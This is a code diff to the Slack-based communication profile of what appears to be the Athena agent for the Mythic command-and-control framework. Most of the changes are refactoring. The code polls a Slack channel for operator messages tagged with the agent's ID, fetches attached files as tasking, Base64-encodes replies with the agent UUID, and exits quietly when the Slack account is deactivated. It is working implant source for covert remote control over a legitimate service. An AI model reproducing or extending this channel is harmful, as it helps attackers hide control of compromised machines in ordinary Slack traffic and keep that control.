@@ -9,6 +9,7 @@ using System.Threading.Tasks;
 using System.Collections.Generic;
 using System.Collections.Specialized;
 using System.Linq;
+using Newtonsoft.Json.Linq;
 
 namespace Athena.Config
 {
@@ -130,7 +131,7 @@ namespace Athena.Config
                 }
                 else
                 {
-                    json = Misc.Base64Encode(Globals.mc.MythicConfig.uuid + json);
+                    json = await Misc.Base64Encode(Globals.mc.MythicConfig.uuid + json);
                 }
 
                 int i = 0;
@@ -151,8 +152,6 @@ namespace Athena.Config
                 i = 0;
 
                 //Give the server a second to respond.
-                await Task.Delay(3000);
-
 
                 result = await GetSlackMessages();
 
@@ -196,7 +195,7 @@ namespace Athena.Config
                     }
                     else
                     {
-                        return Misc.Base64Decode(json).Substring(36);
+                        return (await Misc.Base64Decode(json)).Substring(36);
                     }
                 }
             }
@@ -325,61 +324,76 @@ namespace Athena.Config
         {
             Dictionary<string, MythicMessageWrapper> messages = new Dictionary<string, MythicMessageWrapper>();
             string res = "";
+            ConversationHistoryResponse msgResponse;
 
-
-            for(int i = 0; i < this.messageChecks; i++) //Keep submitting web request until it works or we hit our max checks
+            for (int i = 0; i < this.messageChecks; i++) //Keep submitting web request until it works or we hit our max checks
             {
+                await Task.Delay(this.timeBetweenChecks * 1000); //Do a delay between each check
                 try
                 {
                     res = await SendGet($"https://slack.com/api/conversations.history?channel={this.channel}&limit=200");
+                    JObject o = JObject.Parse(res);
 
-                    ConversationHistoryResponse msgResponse = JsonConvert.DeserializeObject<ConversationHistoryResponse>(res);
-
-                    if(msgResponse == null) //Try Again
+                    if (!(bool)o["ok"])
                     {
-                        await Task.Delay(this.timeBetweenChecks * 1000);
+                        if ((string)o["error"] == "account_inactive")
+                        {
+                            Environment.Exit(0);
+                        }
                         continue;
                     }
 
-                    foreach (var message in msgResponse.messages)
-                    {
-                        try
-                        {
-                            if (message.text.Contains(this.agent_guid))
-                            {
-                                MythicMessageWrapper mythicMessage = JsonConvert.DeserializeObject<MythicMessageWrapper>(message.text);
+                    msgResponse = JsonConvert.DeserializeObject<ConversationHistoryResponse>(res);
 
-                                if (!mythicMessage.to_server && mythicMessage.sender_id == this.agent_guid)
+                    if (msgResponse is not null && msgResponse.messages is not null) //Try Again
+                    {
+                        foreach (var message in msgResponse.messages)
+                        {
+                            try
+                            {
+                                if (message.text.Contains(this.agent_guid))
                                 {
-                                    if (String.IsNullOrEmpty(mythicMessage.message))
+                                    MythicMessageWrapper mythicMessage = JsonConvert.DeserializeObject<MythicMessageWrapper>(message.text);
+
+                                    if (!mythicMessage.to_server && mythicMessage.sender_id == this.agent_guid)
                                     {
-                                        mythicMessage.message = await SendGet(message.files.FirstOrDefault().url_private);
+                                        if (String.IsNullOrEmpty(mythicMessage.message))
+                                        {
+                                            mythicMessage.message = await SendGet(message.files.FirstOrDefault().url_private);
+                                        }
+                                        messages.Add(message.ts, mythicMessage);
                                     }
-                                    messages.Add(message.ts, mythicMessage);
                                 }
                             }
+                            catch (Exception e)
+                            {
+                                Misc.WriteError(e.StackTrace);
+                            }
                         }
-                        catch (Exception e)
-                        {
 
-                            Misc.WriteError($"[GetSlackMessages] {e.Message}");
-                            Misc.WriteError(e.StackTrace);
+                        if (messages.Count < 1)
+                        {
+                            await Task.Delay(this.timeBetweenChecks * 1000);
+                            continue;
+                        }
+                        else
+                        {
+                            break;
                         }
                     }
-
-                    if(messages.Count < 1) //Try Again
+                    else //Message response parse is null
                     {
-                        await Task.Delay(this.timeBetweenChecks * 1000);
+                        continue;
+                    }
+
+                    if (messages.Count < 1) //Server hasn't responded yet
+                    {
                         continue;
                     }
                     else //Got some messages for us!
                     {
                         break;
                     }
-                }
-                catch (WebException we)
-                {
-                    continue;
                 }
                 catch (Exception e)
                 {
@@ -462,7 +476,7 @@ namespace Athena.Config
                 }
                 return "";
             }
-            catch(Exception ex)
+            catch (Exception ex)
             {
                 return "";
             }
